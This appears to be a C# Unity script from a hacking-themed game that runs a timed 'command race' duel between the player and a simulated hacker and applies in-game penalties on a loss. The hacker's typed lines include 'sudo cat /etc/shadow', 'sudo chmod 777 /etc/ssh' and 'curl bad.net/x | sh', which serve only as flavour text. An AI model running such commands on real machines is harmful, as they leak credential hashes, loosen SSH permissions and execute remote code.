using System;
using UnityEngine;

namespace Uptime.Connections
{
    public enum DuelVariant { CommandRace }
    public enum DuelLifecycle { Pending, Active, Result }
    public enum DuelOutcome { Won, Lost, Conceded }

    public sealed class DuelEncounter
    {
        public int Id { get; internal set; }
        public NodeResources Target { get; internal set; }
        public DuelVariant Variant { get; internal set; }
        public DuelLifecycle Lifecycle { get; internal set; }
        public string Source { get; internal set; }
        public float ScheduledAt { get; internal set; }
        public float LaunchAt { get; internal set; }
        public float WarningSeconds => LaunchAt - ScheduledAt;
        public InfectionKind LossInfection { get; internal set; }
        public float LossParameter { get; internal set; }
        public ConsequencePlan LossPlan { get; internal set; }
        public ConsequenceExecution LossExecution { get; internal set; }
        public bool? PlayerWon { get; internal set; }
        public DuelOutcome? Outcome { get; internal set; }
        public bool? InfectionApplied { get; internal set; }
        public bool IntegrityDamaged { get; internal set; }
        public string ApplicationReason { get; internal set; }
    }

    // One authoritative slot for direct and connection-triggered Duels.
    public sealed class ConnectionsDuelDirector : MonoBehaviour
    {
        [SerializeField] private SimulationHost host;
        [SerializeField] private ConnectionsDuelOverlay overlay;
        [SerializeField, Min(0f)] private float defaultWarningSeconds = 8f;
        [SerializeField] private bool continueSimulationDuringDuel = true;
        [SerializeField] private InfectionKind lossInfection = InfectionKind.PhantomLoad;
        [SerializeField, Min(0f)] private float lossParameter = 3f;
        [SerializeField] private ConsequenceCandidate[] defaultConsequencePool;
        [SerializeField] private string[] playerCommands =
        { "ss -tnp | grep :22", "tail -f /var/log/auth.log", "grep denied auth.log", "sudo service ssh restart" };
        [SerializeField] private string[] hackerCommands =
        { "sudo -l", "sudo cat /etc/shadow", "sudo chmod 777 /etc/ssh", "curl bad.net/x | sh" };
        [SerializeField, Min(.01f)] private float hackerCharacterSeconds = .24f;
        [SerializeField, Range(0f, .9f)] private float hackerTimingVariance = .35f;
        [SerializeField, Range(0f, 1f)] private float hackerMistakeChance = .035f;
        [SerializeField, Range(0f, 1f)] private float hackerHesitationChance = .08f;

        private DuelEncounter current;
        private int nextId;
        public DuelEncounter Current => current;
        public bool PausesSimulation => current != null &&
            current.Lifecycle != DuelLifecycle.Pending && !continueSimulationDuringDuel;
        public float DefaultWarningSeconds => defaultWarningSeconds;
        public event Action<DuelEncounter> Changed;

        private void Awake()
        {
            if (host == null) host = GetComponent<SimulationHost>();
        }

        private void OnEnable()
        {
            if (host == null) host = GetComponent<SimulationHost>();
            if (host == null) return;
            host.EffectOccurred += OnEffect;
            host.SimulationReset += ResetDuel;
        }

        private void OnDisable()
        {
            if (host != null)
            {
                host.EffectOccurred -= OnEffect;
                host.SimulationReset -= ResetDuel;
            }
            ResetDuel();
        }

        public bool TrySchedule(string targetNodeId, DuelVariant variant, float warningSeconds,
            string source, out string reason, ConsequenceConfiguration consequences = null)
        {
            if (host != null && host.RunEnded)
                reason = host.RunEndedError;
            else if (current != null)
                reason = "duel_slot_occupied_by_" + current.Lifecycle.ToString().ToLowerInvariant();
            else if (host == null || overlay == null)
                reason = "duel_unavailable";
            else if (variant != DuelVariant.CommandRace)
                reason = "unknown_duel_variant";
            else if (float.IsNaN(warningSeconds) || float.IsInfinity(warningSeconds) ||
                warningSeconds < 0f)
                reason = "invalid_warning_duration";
            else if (host.FindNodeResources(targetNodeId) == null)
                reason = "unknown_node";
            else reason = null;

            if (reason != null)
            {
                host?.Recorder?.RecordDuel("duel_rejected", current, host.SimulationTimeSeconds,
                    source, targetNodeId, reason);
                return false;
            }
            float now = host.SimulationTimeSeconds;
            int encounterId = nextId + 1;
            int seed = unchecked((host.GetComponent<ConnectionTrafficDirector>()?.Seed ?? 1701) ^
                encounterId * 61463 ^ (int)0x45A189D1);
            ConsequenceCandidate[] defaults = defaultConsequencePool != null &&
                defaultConsequencePool.Length > 0 ? defaultConsequencePool :
                ConsequencePlanner.StandardPool(lossInfection, lossParameter);
            if (!ConsequencePlanner.TryPlan(host, "duel-" + encounterId,
                source ?? "director", targetNodeId, defaults, consequences,
                seed, out ConsequencePlan lossPlan, out reason))
            {
                host.Recorder?.RecordDuel("duel_rejected", null, now,
                    source, targetNodeId, reason);
                return false;
            }
            current = new DuelEncounter
            {
                Id = ++nextId,
                Target = host.FindNodeResources(targetNodeId),
                Variant = variant,
                Lifecycle = DuelLifecycle.Pending,
                Source = source ?? "director",
                ScheduledAt = now,
                LaunchAt = now + warningSeconds,
                LossInfection = lossInfection,
                LossParameter = lossParameter,
                LossPlan = lossPlan
            };
            host.Recorder?.RecordConsequencePlan(lossPlan);
            host.Recorder?.RecordDuel("duel_scheduled", current, now);
            Changed?.Invoke(current);
            if (warningSeconds == 0f) Launch();
            return true;
        }

        public bool TrySchedule(string targetNodeId, out string reason) =>
            TrySchedule(targetNodeId, DuelVariant.CommandRace, defaultWarningSeconds,
                "director", out reason);

        public float RemainingFor(NodeView node) => current != null &&
            current.Lifecycle == DuelLifecycle.Pending && current.Target.View == node ?
            Mathf.Max(0f, current.LaunchAt - host.SimulationTimeSeconds) : -1f;

        public float TimeToBoundary(float now) => current != null &&
            current.Lifecycle == DuelLifecycle.Pending ?
            Mathf.Max(.000001f, current.LaunchAt - now) : float.PositiveInfinity;

        public void Advance(float now)
        {
            if (host.RunEnded) return;
            if (current != null && current.Lifecycle == DuelLifecycle.Pending &&
                now + .00001f >= current.LaunchAt) Launch();
        }

        private void Launch()
        {
            if (current == null || current.Lifecycle != DuelLifecycle.Pending) return;
            current.Lifecycle = DuelLifecycle.Active;
            host.Recorder?.RecordDuel("duel_started", current, host.SimulationTimeSeconds);
            Changed?.Invoke(current);
            var race = new CommandRaceSession(playerCommands, hackerCommands,
                unchecked((host.GetComponent<ConnectionTrafficDirector>()?.Seed ?? 1701) ^
                    current.Id * 48271), hackerCharacterSeconds,
                hackerTimingVariance, hackerMistakeChance, hackerHesitationChance);
            overlay.Open(current, race, this);
        }

        public void Resolve(CommandRaceSession race)
        {
            if (host.RunEnded || current == null || current.Lifecycle != DuelLifecycle.Active ||
                race == null || !race.PlayerWon.HasValue) return;
            ResolveOutcome(current, race, race.PlayerWon == true ? DuelOutcome.Won : DuelOutcome.Lost);
        }

        public bool Concede(DuelEncounter encounter, CommandRaceSession race)
        {
            if (host.RunEnded || encounter == null || !ReferenceEquals(current, encounter) ||
                encounter.Lifecycle != DuelLifecycle.Active || race == null ||
                race.PlayerWon.HasValue) return false;
            ResolveOutcome(encounter, race, DuelOutcome.Conceded);
            return true;
        }

        private void ResolveOutcome(DuelEncounter resolved, CommandRaceSession race, DuelOutcome outcome)
        {
            bool previousBoundary = host.BeginBoundaryMutation();
            try
            {
                // Claim resolution before consequences/callbacks can reenter. Concession leaves
                // the race unfinished; only the encounter has an authoritative outcome.
                resolved.Lifecycle = DuelLifecycle.Result;
                resolved.Outcome = outcome;
                resolved.PlayerWon = race.PlayerWon;
                if (outcome != DuelOutcome.Won)
                {
                    resolved.LossExecution = ConsequenceExecutor.Execute(host, resolved.LossPlan, true);
                    resolved.IntegrityDamaged = host.DamageIntegrity(resolved.Target, "duel", "duel:" + resolved.Id, true, false);
                    resolved.InfectionApplied = false;
                    foreach (ConsequenceComponentResult part in resolved.LossExecution.Components)
                        if (part.Effect.Kind == ConsequenceKind.Infection && part.Succeeded)
                            resolved.InfectionApplied = true;
                    resolved.ApplicationReason = resolved.LossExecution.AnySucceeded ? null :
                        "no_effect_applied";
                }
                else host.Recorder?.RecordConsequencePrevented(resolved.LossPlan,
                    host.SimulationTimeSeconds);
                host.Recorder?.RecordDuel("duel_resolved", resolved, host.SimulationTimeSeconds,
                    null, null, resolved.ApplicationReason, race);
                Changed?.Invoke(resolved);
                host.Recorder?.RecordDuel("duel_slot_released", resolved,
                    host.SimulationTimeSeconds);
                if (ReferenceEquals(current, resolved))
                {
                    current = null;
                    Changed?.Invoke(null);
                }
                host.CompleteIntegrityBoundary();
            }
            finally { host.EndBoundaryMutation(previousBoundary); }
        }

        public void FinishResult()
        {
            // Result presentation may outlast the authoritative encounter.
        }

        public void ResetDuel()
        {
            overlay?.Abort();
            current = null;
            nextId = 0;
            Changed?.Invoke(null);
        }

        private void OnEffect(ConnectionEffectOccurrence occurrence)
        {
            if (occurrence.Type != CompletionEffect.DuelSchedule) return;
            TrySchedule(occurrence.TargetNodeId, DuelVariant.CommandRace,
                defaultWarningSeconds,
                "connection:" + occurrence.ConnectionId + "/op:" +
                    occurrence.OperationIndex, out _);
        }
    }
}
